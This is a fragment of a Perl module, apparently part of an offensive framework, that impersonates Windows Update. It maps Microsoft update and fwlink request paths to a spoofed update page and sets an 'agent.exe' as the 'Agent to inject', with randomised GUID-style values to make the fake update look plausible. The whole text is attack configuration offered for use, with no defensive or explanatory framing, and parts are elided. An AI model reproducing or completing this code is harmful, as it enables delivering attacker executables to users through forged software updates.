...
my $base=
{
    ...
    'request' => [
                    {
                    'req' => '(/redirect.asp|^/$|/microsoftupdate/v6/default.aspx|redir.dll)',
                    'type' => 'file',
                    'file' => './include/wupdate/init.html',
                    },
		    {
                    'req' => '(/fwlink/\?linkid|/fwlink/\?LinkId)', #/fwlink/?LinkId=119721&clcid=0x409
                    'type' => 'string',
                    ...
                    {
                    'req' => '/inc/splash_archivos/trans_pixel_archivos/trans_pixel.gif',
                    'type' => 'file',
    ...
    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
		    'enable' => { 'val' => 1, 
			    	  'desc' => 'Status'},
                   'rnd1'  => { 'val' => "isrcore::utils::RndAlpha(8).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(12)",
                                 'hidden' => 1,
                                 'dynamic' =>1,
                                },
                   'rnd2'  => { 'val' => "isrcore::utils::RndNum(5)",
                                 'hidden' => 1,
                                 'dynamic' =>1,
                                },
                                
		    'familyid'  => { 'val' => 'ad724ae0-e72d-4f54-9ab3-75b8eb148356',
